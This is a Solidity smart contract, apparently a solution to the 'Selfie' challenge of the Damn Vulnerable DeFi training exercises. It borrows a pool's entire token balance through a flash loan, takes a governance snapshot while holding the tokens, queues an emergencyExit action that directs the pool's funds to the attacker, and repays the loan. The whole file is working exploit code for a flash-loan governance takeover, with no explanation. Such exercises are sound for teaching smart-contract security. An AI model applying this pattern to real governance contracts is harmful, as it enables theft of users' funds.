import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";
contract attackerSelfie {
    SimpleGovernance immutable simpleGovernance;
    SelfiePool immutable selfiePool;
    DamnValuableTokenSnapshot private token;
    address private owner;

    constructor (address _simpleGovernance, address _selfiePool, address _token){
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        selfiePool = SelfiePool(_selfiePool);
        token = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    function attack() external{

        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(selfiePool)), "0x0");

    }
// msg.sender, _token, _amount, 0, _data
    function onFlashLoan(address _sender, address _token, uint256 _amount, uint256 _value, bytes memory data) external returns(bytes32) {
        
         token.snapshot();
        address receiver = owner;

        bytes memory _data = abi.encodeWithSignature("emergencyExit(address)", receiver, 0);

        simpleGovernance.queueAction(address(selfiePool), 0, _data);

        token.approve(address(selfiePool), _amount);


        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }


  

}